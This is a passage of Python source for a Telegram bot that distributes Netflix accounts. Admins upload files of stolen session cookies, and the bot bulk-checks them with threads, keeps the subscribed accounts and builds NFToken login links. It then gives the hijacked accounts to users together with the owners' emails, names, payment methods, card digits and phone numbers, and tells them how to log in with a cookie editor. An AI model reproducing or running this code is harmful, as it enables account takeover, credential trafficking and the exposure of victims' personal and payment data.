            # Generate NFToken for ALL accounts (FREE + PAID)
            nftoken = None
            nftoken_expiry = None
            nftoken, nftoken_expiry = generate_nftoken(cookies_dict.get("NetflixId"), attempts=3)
            
            return {
                "valid": True,
                "subscribed": is_subscribed,
                "on_hold": is_on_hold,
                "email": email,
                "name": name,
                "country": country,
                "plan": plan,
                "plan_key": plan_key,
                "plan_label": plan_label,
                "streams": streams,
                "quality": quality,
                "price": price,
                "billing_date": billing,
                "member_since": member_since,
                "payment_method": payment_method,
                "card_last4": card_last4,
                "phone": phone,
                "extra_member": extra_member,
                "membership_status": membership_status,
                "email_verified": email_verified,
                "profiles": profiles_str,
                "user_guid": user_guid,
                "nftoken": nftoken,
                "nftoken_expiry": nftoken_expiry,
            }
            
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                continue
            return {"valid": False, "error": "Timeout"}
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                continue
            return {"valid": False, "error": str(e)}
    
    return {"valid": False, "error": "Max retries exceeded"}

# ============================================================
# FILE PROCESSING
# ============================================================

def extract_files_from_source(source_path: str) -> List[Dict]:
    files = []
    if os.path.isfile(source_path):
        if source_path.lower().endswith('.zip'):
            with zipfile.ZipFile(source_path, 'r') as zf:
                for name in zf.namelist():
                    if name.lower().endswith(('.txt', '.json')):
                        try:
                            content = zf.read(name).decode('utf-8', errors='ignore')
                            files.append({"name": name, "content": content})
                        except:
                            pass
        else:
            with open(source_path, 'r', encoding='utf-8', errors='ignore') as f:
                files.append({"name": os.path.basename(source_path), "content": f.read()})
    elif os.path.isdir(source_path):
        for root, _, filenames in os.walk(source_path):
            for fname in filenames:
                if fname.lower().endswith(('.txt', '.json')):
                    with open(os.path.join(root, fname), 'r', encoding='utf-8', errors='ignore') as f:
                        files.append({"name": fname, "content": f.read()})
    return files

# ============================================================
# TELEGRAM BOT - HANDLERS
# ============================================================

def clean_channel_id(ch_id: str):
    if not ch_id:
        return None
    ch_id = ch_id.strip()
    if ch_id.startswith("-100") or ch_id.isdigit():
        try:
            return int(ch_id)
        except:
            return ch_id
    if ch_id.startswith("@"):
        return ch_id
    if "t.me/" in ch_id:
        username = ch_id.split("t.me/")[-1].strip("/")
        if username and not username.startswith("+"):
            return f"@{username}"
    return None

async def check_force_join(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    channels = get_channels()
    channels = [c for c in channels if c["is_active"]]
    if not channels:
        return True
    for channel in channels:
        target_id = clean_channel_id(channel.get("channel_id", ""))
        if not target_id:
            continue
        try:
            member = await context.bot.get_chat_member(target_id, user_id)
            if member.status in [ChatMember.LEFT, ChatMember.KICKED]:
                return False
        except:
            continue
    return True

# ============================================================
# START
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await update.message.reply_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    create_user(user_id, user.username or "", user.first_name or "")
    update_user_username(user_id, user.username or "")
    
    user_data = get_user(user_id)
    if user_data and user_data["is_banned"]:
        await update.message.reply_text("🚫 You are banned from using this bot.")
        return
    
    joined = await check_force_join(user_id, context)
    if not joined:
        channels = get_channels()
        channels = [c for c in channels if c["is_active"]]
        keyboard = []
        for ch in channels:
            keyboard.append([InlineKeyboardButton(f"📢 Join {ch['channel_name']}", url=ch["invite_link"])])
        keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
        await update.message.reply_text(
            "🚨 **Please join our channels first!**\n\nYou must join all channels below to use this bot:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    
    stats = get_total_accounts()
    
    plan_emojis = {
        "PREMIUM": "👑",
        "STANDARD": "⭐",
        "BASIC": "🎯",
        "MOBILE": "📱",
        "FREE": "🆓",
        "STANDARD_WITH_ADS": "📺"
    }
    
    plan_display = ""
    for plan, count in stats['plans'].items():
        emoji = plan_emojis.get(plan, "📦")
        plan_display += f"│ {emoji} {plan}: **{count}**\n"
    
    if not plan_display:
        plan_display = "│ No accounts available\n"
    
    text = f"""
🌟 **WELCOME TO SENZO NETFLIX BOT** 🌟

━━━━━━━━━━━━━━━━━━━━━
👋 Hello **{user.first_name}**!
━━━━━━━━━━━━━━━━━━━━━

📊 **ACCOUNT STATUS**
┌─────────────────────
│ 📦 Total Available: **{stats['total']}**
{plan_display}└─────────────────────

⚙️ **YOUR STATS**
┌─────────────────────
│ ✅ Working Reports: **{user_data.get('working_reports', 0) if user_data else 0}**
│ ❌ Not Working: **{user_data.get('notworking_reports', 0) if user_data else 0}**
│ 📦 Accounts Used: **{user_data.get('accounts_used', 0) if user_data else 0}/{MAX_ACCOUNTS_PER_USER}**
└─────────────────────

⏳ Cooldown: **{WORKING_COOLDOWN_MINUTES} min**

━━━━━━━━━━━━━━━━━━━━━
🔽 **SELECT AN OPTION BELOW**
"""
    
    assigned = get_assigned_account(user_id)
    
    keyboard = [
        [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
    ]
    
    if assigned:
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data="working"),
            InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
        ])
    
    keyboard.append([
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
        InlineKeyboardButton("📊 My Status", callback_data="my_status"),
    ])
    
    if user_data and (user_data["is_admin"] or user_id in ADMIN_IDS):
        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
    
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

# ============================================================
# CHECK_JOIN_CALLBACK
# ============================================================

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    joined = await check_force_join(user_id, context)
    if joined:
        await query.edit_message_text("✅ You've joined all channels! Starting bot...")
        await start(update, context)
    else:
        await query.answer("❌ You haven't joined all channels yet!", show_alert=True)

# ============================================================
# GET ACCOUNT - ALWAYS SHOW LOGIN BUTTONS
# ============================================================

async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    user_data = get_user(user_id)
    if user_data and user_data["is_banned"]:
        await query.edit_message_text("🚫 You are banned.")
        return
    
    can_get, msg = can_get_account(user_id)
    if not can_get:
        await query.edit_message_text(msg)
        return
    
    joined = await check_force_join(user_id, context)
    if not joined:
        await query.edit_message_text("⚠️ Please join all required channels first! Use /start")
        return
    
    accounts = get_available_accounts()
    if not accounts:
        await query.edit_message_text("❌ No accounts available right now. Please try again later!")
        return
    
    account = accounts[0]
    if assign_account(user_id, account["id"]):
        
        cookie_full = account.get('cookies', 'No cookies available')
        if len(cookie_full) > 3900:
            cookie_display = cookie_full[:3900] + "\n\n... (cookie truncated due to length)"
        else:
            cookie_display = cookie_full
        
        text = f"""
🎉 **ACCOUNT ASSIGNED!**

━━━━━━━━━━━━━━━━━━━━━
📧 **Email:** `{account.get('email', 'Unknown')}`
👤 **Name:** {account.get('account_name', 'Unknown')}
🌍 **Country:** {account.get('country', 'Unknown')}
📦 **Plan:** {account.get('plan', 'Unknown')}
📺 **Streams:** {account.get('streams', '?')}
🎞️ **Quality:** {account.get('quality', 'Unknown')}
💰 **Price:** {account.get('price', 'N/A')}
🗓️ **Billing:** {account.get('billing_date', 'Unknown')}
👥 **Extra Member:** {'✅ Yes' if account.get('extra_member') else '❌ No'}
🎭 **Profiles:** {account.get('profiles', 'None')}
🆔 **GUID:** `{account.get('user_guid', 'Unknown')}`
━━━━━━━━━━━━━━━━━━━━━

🍪 **Cookie:**
`{cookie_display}`

━━━━━━━━━━━━━━━━━━━━━

📝 **INSTRUCTIONS:**
1️⃣ Click a login link below
2️⃣ Test the account
3️⃣ **IMPORTANT:** After testing, click Working or Not Working
   and upload a screenshot as proof
"""
        
        keyboard = []
        
        token = account.get('nftoken')
        
        # ALWAYS show login buttons - with or without token
        if token and token != "None" and len(str(token)) > 10:
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url=f"https://netflix.com/unsupported?nftoken={token}"),
                InlineKeyboardButton("🖥️ PC Login", url=f"https://netflix.com/login?nftoken={token}")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url=f"https://netflix.com/tv8?nftoken={token}")
            ])
            if account.get("nftoken_expiry"):
                text += f"\n⏳ NFToken expires: `{account['nftoken_expiry']}`"
        else:
            # No token - still show login buttons (direct links)
            keyboard.append([
                InlineKeyboardButton("📱 Phone Login", url="https://netflix.com/unsupported"),
                InlineKeyboardButton("🖥️ PC Login", url="https://netflix.com/login")
            ])
            keyboard.append([
                InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
            ])
            text += "\n\n💡 **Use the cookie above** with a cookie editor extension to login."
        
        text += "\n\n✅ **After testing, report below:**"
        keyboard.append([
            InlineKeyboardButton("✅ Working", callback_data=f"report_working_{account['id']}"),
            InlineKeyboardButton("❌ Not Working", callback_data=f"report_notworking_{account['id']}")
        ])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
        
        text += "\n\n👨‍💻 **Developer:** @Senzo268"
        
        await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode=ParseMode.MARKDOWN,
        )
    else:
        await query.edit_message_text("❌ Failed to assign account. Please try again!")

# ============================================================
# WORKING / NOT WORKING CALLBACKS
# ============================================================

async def working_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    assigned = get_assigned_account(user_id)
    if not assigned:
        await query.answer("⚠️ No active account! Click 'Get Account' first.", show_alert=True)
        return
    query.data = f"report_working_{assigned['id']}"
    await report_account(update, context)

async def notworking_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    assigned = get_assigned_account(user_id)
    if not assigned:
        await query.answer("⚠️ No active account! Click 'Get Account' first.", show_alert=True)
        return
    query.data = f"report_notworking_{assigned['id']}"
    await report_account(update, context)

async def report_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    parts = data.split("_")
    report_type = parts[1]
    account_id = int(parts[2])
    user_id = query.from_user.id
    
    user_data = get_user(user_id)
    if user_data and user_data["is_banned"]:
        await query.edit_message_text("🚫 You are banned.")
        return
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You already have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    set_pending_report(user_id, account_id, report_type)
    
    emoji = "✅" if report_type == "working" else "❌"
    await query.edit_message_text(
        f"{emoji} **Report: {report_type.upper()}**\n\n"
        f"📸 **Please upload a screenshot proof** for this report.\n\n"
        f"⚠️ **You must upload a screenshot before you can do anything else!**\n\n"
        f"Send a screenshot image now.\n\n👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )

async def handle_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    
    if user_data and user_data["is_banned"]:
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if not has_pending_report(user_id):
        await update.message.reply_text(
            "❌ You don't have any pending report.\n\n"
            "Use the menu buttons to report an account first.\n\n"
            "👨‍💻 **Developer:** @Senzo268",
        )
        return
    
    pending = get_pending_report_data(user_id)
    if not pending:
        clear_pending_report(user_id)
        await update.message.reply_text("❌ Invalid pending report. Please try again.\n\n👨‍💻 **Developer:** @Senzo268")
        return
    
    photo = update.message.photo
    if not photo:
        await update.message.reply_text(
            "❌ Please upload an **image/screenshot**.\n\n"
            "Send a screenshot image to complete your report.\n\n"
            "👨‍💻 **Developer:** @Senzo268",
        )
        return
    
    file_id = photo[-1].file_id
    
    report_id = create_report(
        user_id,
        pending["account_id"],
        pending["report_type"],
        file_id,
    )
    clear_pending_report(user_id)
    release_account(pending["account_id"])
    
    await update.message.reply_text(
        f"✅ **Report submitted!**\n\n"
        f"Report ID: #{report_id}\n"
        f"Type: {pending['report_type'].upper()}\n\n"
        f"Admin will review your report shortly.\n"
        f"You can now use the bot again.\n\n"
        f"👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )
    
    await notify_admins_report(context.bot, report_id, user_id, pending["account_id"], pending["report_type"])

async def notify_admins_report(bot, report_id: int, user_id: int, account_id: int, report_type: str):
    user = get_user(user_id) or {}
    account = get_assigned_account(user_id) or {}
    
    text = f"""
📋 **NEW REPORT RECEIVED**

Report ID: #{report_id}
User: @{user.get('username', 'NoUsername')}
Type: **{report_type.upper()}**
Account: `{account.get('email', 'Unknown')}`
Plan: {account.get('plan', 'Unknown')}

👨‍💻 **Developer:** @Senzo268
"""
    
    cur = db.execute('SELECT screenshot_file_id FROM reports WHERE id = ?', (report_id,))
    row = cur.fetchone()
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Accept", callback_data=f"review_accept_{report_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"review_reject_{report_id}"),
        ],
        [InlineKeyboardButton("👁️ View All Reports", callback_data="admin_reports")],
    ]
    
    for admin_id in ADMIN_IDS:
        try:
            if row and row[0]:
                await bot.send_photo(
                    admin_id,
                    row[0],
                    caption=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.MARKDOWN,
                )
            else:
                await bot.send_message(
                    admin_id,
                    text + "\n⚠️ Screenshot not available",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.MARKDOWN,
                )
        except:
            try:
                await bot.send_message(
                    admin_id,
                    text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode=ParseMode.MARKDOWN,
                )
            except:
                pass

async def review_report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    parts = data.split("_")
    action = parts[1]
    report_id = int(parts[2])
    admin_id = query.from_user.id
    
    if admin_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    status = "accepted" if action == "accept" else "rejected"
    review_report(report_id, status, admin_id)
    
    cur = db.execute('SELECT user_id, report_type, account_id FROM reports WHERE id = ?', (report_id,))
    row = cur.fetchone()
    
    if row:
        user_id_reporter, report_type, account_id = row
        try:
            if status == "accepted":
                msg = f"✅ Your report (#{report_id}) was **accepted**!"
                if report_type == "working":
                    msg += "\n\n🎉 Account marked as working. Thank you!"
                else:
                    msg += "\n\n🔄 Account has been removed from stock."
            else:
                msg = f"❌ Your report (#{report_id}) was **rejected**.\n\n⚠️ Please only submit genuine reports."
            msg += "\n\n👨‍💻 **Developer:** @Senzo268"
            await context.bot.send_message(user_id_reporter, msg, parse_mode=ParseMode.MARKDOWN)
        except:
            pass
    
    await query.edit_message_text(f"✅ Report #{report_id} has been **{status.upper()}**!")

async def contact_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    user_data = get_user(user_id)
    if user_data and user_data["is_banned"]:
        await query.edit_message_text("🚫 You are banned.")
        return
    
    await query.edit_message_text(
        "📝 **CONTACT ADMIN**\n\n"
        "Type your message below.\n"
        "Admin will reply to you as soon as possible.\n\n"
        "👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )
    context.user_data["waiting_for_message"] = True

async def my_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    user = get_user(user_id)
    if not user:
        await query.edit_message_text("❌ User not found. Use /start first.")
        return
    
    account = get_assigned_account(user_id)
    reports = get_reports_by_user(user_id)
    history = get_account_history(user_id)
    
    text = f"""
📊 **YOUR STATUS**

━━━━━━━━━━━━━━━━━━━━━
👤 **Name:** {user.get('first_name', 'Unknown')}
🆔 **ID:** `{user_id}`
📅 **Joined:** {user.get('joined_at', 'Unknown')}
━━━━━━━━━━━━━━━━━━━━━

📈 **STATISTICS**
┌─────────────────────
│ ✅ Working Reports: **{user.get('working_reports', 0)}**
│ ❌ Not Working: **{user.get('notworking_reports', 0)}**
│ 📦 Accounts Used: **{user.get('accounts_used', 0)}/{MAX_ACCOUNTS_PER_USER}**
└─────────────────────

🔑 **CURRENT ACCOUNT:**
"""
    if account:
        text += f"""
┌─────────────────────
│ 📧 `{account['email']}`
│ 🌍 {account.get('country', 'Unknown')}
│ 📦 {account.get('plan', 'Unknown')}
│ 📺 {account.get('streams', '?')} streams
└─────────────────────
"""
    else:
        text += "❌ None\n"
    
    if reports:
        text += "\n📋 **RECENT REPORTS:**\n"
        for r in reports[:5]:
            emoji = "✅" if r["status"] == "accepted" else "❌" if r["status"] == "rejected" else "⏳"
            text += f"{emoji} #{r['id']} - {r['type']} - {r['status']}\n"
    
    if history:
        text += "\n📜 **RECENT ACCOUNTS:**\n"
        for h in history[:3]:
            text += f"▫️ `{h['email']}` - {h['plan']}\n"
    
    text += f"\n⏳ **Cooldown:** {WORKING_COOLDOWN_MINUTES} min"
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_menu")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if has_pending_report(user_id):
        pending = get_pending_report_data(user_id)
        if pending:
            await query.edit_message_text(
                f"⚠️ **You have a pending report!**\n\n"
                f"Please upload a screenshot proof for your **{pending['report_type'].upper()}** report first.\n\n"
                f"📸 Send a screenshot image now.\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
            return
    
    await start(update, context)

# ============================================================
# ADMIN PANEL
# ============================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    stats = get_dashboard_stats()
    pending_reports = get_pending_reports()
    
    text = f"""
⚙️ **ADMIN PANEL**

━━━━━━━━━━━━━━━━━━━━━
📊 **STATISTICS**
┌─────────────────────
│ 👥 Total Users: **{stats['total_users']}**
│ ✅ Active Users: **{stats['active_users']}**
│ 📦 Available: **{stats['available']}**
│ 🟢 Working: **{stats['total_working']}**
│ 🔒 Assigned: **{stats['assigned']}**
│ 📋 Pending Reports: **{stats['pending_reports']}**
│ ✅ Accepted Reports: **{stats['accepted_reports']}**
│ ❌ Rejected Reports: **{stats['rejected_reports']}**
│ 📩 Pending Messages: **{stats['pending_messages']}**
└─────────────────────

📦 **PLAN BREAKDOWN:**
"""
    for plan, count in stats.get('plan_counts', {}).items():
        text += f"│ {plan}: **{count}**\n"
    
    text += f"""
📋 **Pending Reports:** {len(pending_reports)}
━━━━━━━━━━━━━━━━━━━━━

🔽 **ADMIN ACTIONS:**
"""
    
    keyboard = [
        [InlineKeyboardButton("📤 Upload Stock", callback_data="admin_upload")],
        [InlineKeyboardButton("📋 View Reports", callback_data="admin_reports")],
        [InlineKeyboardButton("📩 View Messages", callback_data="admin_messages")],
        [InlineKeyboardButton("👥 Users List", callback_data="admin_users")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("⚙️ Manage Channels", callback_data="admin_channels")],
        [InlineKeyboardButton("📊 Stock Logs", callback_data="admin_stock_logs")],
        [InlineKeyboardButton("📈 Dashboard", callback_data="admin_dashboard")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")],
    ]
    
    text += "\n\n👨‍💻 **Developer:** @Senzo268"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN,
    )

async def admin_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    await query.edit_message_text(
        "📤 **UPLOAD COOKIE FILE**\n\n"
        "Send a **.txt**, **.json**, or **.zip** file containing Netflix cookies.\n\n"
        "The bot will extract ALL cookies and check them.\n\n"
        "⚠️ For **.zip** files, all .txt/.json files inside will be processed.\n\n"
        "👨‍💻 **Developer:** @Senzo268",
        parse_mode=ParseMode.MARKDOWN,
    )
    context.user_data["waiting_for_upload"] = True

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Not authorized!")
        return
    
    if not context.user_data.get("waiting_for_upload"):
        return
    
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ Please send a file.")
        return
    
    file_name = document.file_name
    if not file_name.lower().endswith(('.txt', '.json', '.zip')):
        await update.message.reply_text("❌ Please send .txt, .json, or .zip file.")
        return
    
    await update.message.reply_text(
        f"⏳ Processing **{file_name}**...\n"
        f"This may take a while.",
        parse_mode=ParseMode.MARKDOWN,
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        
        if file_name.lower().endswith('.zip'):
            temp_dir = f"temp_{random.randint(1000, 9999)}"
            os.makedirs(temp_dir, exist_ok=True)
            zip_path = os.path.join(temp_dir, file_name)
            with open(zip_path, 'wb') as f:
                f.write(file_content)
            
            files_to_check = []
            with zipfile.ZipFile(zip_path, 'r') as zf:
                for name in zf.namelist():
                    if name.lower().endswith(('.txt', '.json')):
                        try:
                            content = zf.read(name).decode('utf-8', errors='ignore')
                            files_to_check.append({"name": name, "content": content})
                        except:
                            pass
            
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            if not files_to_check:
                await update.message.reply_text("❌ No .txt or .json files found in zip.")
                context.user_data["waiting_for_upload"] = False
                return
        else:
            content = file_content.decode('utf-8', errors='ignore')
            files_to_check = [{"name": file_name, "content": content}]
        
        cookie_pairs = []
        for f in files_to_check:
            pairs = extract_all_cookie_pairs(f["content"])
            for nid, sid in pairs:
                cookie_pairs.append({
                    "netflix_id": nid,
                    "secure_id": sid,
                    "source_file": f["name"]
                })
        
        total_cookies = len(cookie_pairs)
        if total_cookies == 0:
            await update.message.reply_text("❌ No Netflix cookies found in any file.")
            context.user_data["waiting_for_upload"] = False
            return
        
        progress_msg = await update.message.reply_text(
            f"🔄 Checking **{total_cookies}** cookies with {MAX_CHECK_THREADS} threads...",
            parse_mode=ParseMode.MARKDOWN,
        )
        
        valid = 0
        invalid = 0
        errors = 0
        all_accounts = []
        checked = 0
        
        with ThreadPoolExecutor(max_workers=MAX_CHECK_THREADS) as executor:
            futures = []
            for cp in cookie_pairs:
                cookies_dict = {"NetflixId": cp["netflix_id"]}
                if cp["secure_id"]:
                    cookies_dict["SecureNetflixId"] = cp["secure_id"]
                futures.append(executor.submit(check_account_full, cookies_dict))
            
            for i, future in enumerate(as_completed(futures)):
                cp = cookie_pairs[i]
                result = future.result()
                checked += 1
                
                if result.get("valid") and result.get("subscribed"):
                    cookie_text = get_cookie_text(cp["netflix_id"], cp["secure_id"])
                    account_data = {
                        "email": result.get("email"),
                        "country": result.get("country"),
                        "plan": result.get("plan_label", "Unknown"),
                        "cookies": cookie_text,
                        "nftoken": result.get("nftoken"),
                        "nftoken_expiry": result.get("nftoken_expiry"),
                        "source_file": cp["source_file"],
                        "account_name": result.get("name"),
                        "streams": result.get("streams"),
                        "quality": result.get("quality"),
                        "price": result.get("price"),
                        "billing_date": result.get("billing_date"),
                        "member_since": result.get("member_since"),
                        "payment_method": result.get("payment_method"),
                        "card_last4": result.get("card_last4"),
                        "phone": result.get("phone"),
                        "extra_member": result.get("extra_member", False),
                        "membership_status": result.get("membership_status"),
                        "email_verified": result.get("email_verified", False),
                        "profiles": result.get("profiles"),
                        "user_guid": result.get("user_guid"),
                    }
                    all_accounts.append(account_data)
                    valid += 1
                elif result.get("valid"):
                    invalid += 1
                else:
                    errors += 1
                
                if checked % 5 == 0 or checked == total_cookies:
                    await progress_msg.edit_text(
                        f"🔄 Checking cookies... **{checked}/{total_cookies}**\n"
                        f"✅ Valid: **{valid}**\n"
                        f"❌ Invalid/Free: **{invalid}**\n"
                        f"⚠️ Errors: **{errors}**",
                        parse_mode=ParseMode.MARKDOWN,
                    )
        
        if all_accounts:
            saved = save_account_batch(all_accounts)
            log_stock(user_id, file_name, total_cookies, saved)
            log_daily_stats(hits=valid, free=invalid, bad=errors)
            
            await progress_msg.edit_text(
                f"✅ **UPLOAD COMPLETE!**\n\n"
                f"📁 **File:** {file_name}\n"
                f"🔍 **Total Cookies:** {total_cookies}\n"
                f"✅ **Valid Subscribed:** {valid}\n"
                f"❌ **Invalid/Free:** {invalid}\n"
                f"⚠️ **Errors:** {errors}\n"
                f"💾 **Saved to DB:** {saved}\n\n"
                f"📊 **New Total Available:** {get_total_accounts()['total']}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
        else:
            await progress_msg.edit_text(
                f"❌ **NO VALID ACCOUNTS FOUND!**\n\n"
                f"📁 File: {file_name}\n"
                f"🔍 Total: {total_cookies}\n"
                f"❌ Invalid/Free: {invalid}\n"
                f"⚠️ Errors: {errors}\n\n"
                f"👨‍💻 **Developer:** @Senzo268",
                parse_mode=ParseMode.MARKDOWN,
            )
        
        context.user_data["waiting_for_upload"] = False
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}\n\n👨‍💻 **Developer:** @Senzo268")
        context.user_data["waiting_for_upload"] = False

async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    reports = get_pending_reports()
    if not reports:
        await query.edit_message_text("📋 **No pending reports.**\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
        return
    
    text = "📋 **PENDING REPORTS**\n\n"
    keyboard = []
    
    for r in reports[:10]:
        emoji = "✅" if r["report_type"] == "working" else "❌"
        text += f"{emoji} #{r['id']} | @{r['username'] or 'NoUsername'} | `{r['email']}` | {r['plan']}\n"
        keyboard.append([
            InlineKeyboardButton(f"#{r['id']} - {r['report_type'].upper()}", callback_data=f"review_accept_{r['id']}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"review_reject_{r['id']}")
        ])
    
    if len(reports) > 10:
        text += f"\nAnd {len(reports) - 10} more..."
    
